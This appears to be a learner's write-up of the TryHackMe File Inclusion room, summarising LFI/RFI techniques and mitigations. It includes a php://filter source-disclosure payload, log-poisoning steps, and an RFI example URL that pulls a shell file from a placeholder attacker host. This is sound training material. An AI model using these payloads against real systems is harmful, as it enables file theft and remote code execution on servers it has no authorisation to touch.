# File Inclusion (LFI/RFI) - TryHackMe Writeup

**Room:** File Inclusion  
**Platform:** TryHackMe  
**Track:** Web Fundamentals  
**Date Completed:** January 16, 2026  
**Difficulty:** Intermediate  
**Time Spent:** 75 minutes  
**Status:** ✅ Completed

## 📋 Overview
This room covered Local File Inclusion (LFI) and Remote File Inclusion (RFI) vulnerabilities, which are critical web security flaws that allow attackers to read sensitive files and potentially execute arbitrary code on the target server.

## 🎯 Key Skills Learned
- Identifying LFI/RFI vulnerabilities in web applications
- Exploiting directory traversal with various bypass techniques
- Using PHP wrappers for source code disclosure
- Log poisoning to achieve Remote Code Execution (RCE)
- Understanding RFI attack vectors and exploitation

## 🔧 Techniques Applied

### 1. Basic LFI Exploitation
2. Advanced Bypass Methods
Null Byte Injection: %00 to bypass file extension appending

PHP Filter Wrappers: php://filter/convert.base64-encode/resource=index.php

Double Encoding: Using URL-encoded traversal sequences

Path Truncation: Leveraging PHP's string length limitations

3. Log Poisoning & RCE
Identify log file location (/var/log/apache2/access.log)

Poison logs with PHP code via User-Agent header

Trigger LFI to include poisoned log file

Execute arbitrary code on the target system

4. Remote File Inclusion
http
http://vulnerable-site.com/index.php?page=http://attacker.com/shell.txt
🛡️ Mitigation Strategies Learned
Input Validation: Sanitize all user input before processing

Whitelisting: Allow only specific, expected values for file parameters

Disable Dangerous Functions: Set allow_url_fopen=Off and allow_url_include=Off in PHP

Use Safe Functions: Implement file inclusion with hardcoded paths or use basename()

Web Application Firewall (WAF): Implement rules to detect traversal attempts

📊 Key Takeaways
LFI vulnerabilities often lead to RCE through log poisoning or file upload

RFI requires allow_url_include to be enabled (rare in modern configurations)

The same vulnerability can exist in different forms across various programming languages

Defense requires a multi-layered approach combining input validation, secure coding, and proper configuration.

🏆 Proof of Completion
https://tryhackme.com/room/fileinc?utm_campaign=social_share&utm_medium=social&utm_content=share-completed-room&utm_source=copy&sharerId=68ba8f21d29ef4abbf7cde02

##next room-- Intro to SSRF
